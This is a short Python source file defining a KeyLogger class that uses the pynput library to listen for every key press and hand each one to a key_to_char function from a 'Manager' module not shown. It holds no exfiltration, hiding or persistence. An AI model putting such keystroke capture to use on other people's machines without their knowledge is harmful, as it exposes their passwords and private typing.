from pynput.keyboard import Listener
from Manager import key_to_char


class KeyLogger:
    def __init__(self):
        self.listener = Listener(on_press=self.on_press)


    def on_press(self, key):
        key_to_char(key)

    def start_listening(self):
        with self.listener:
            self.listener.join()


    def stop_listening(self):
        self.listener.stop()


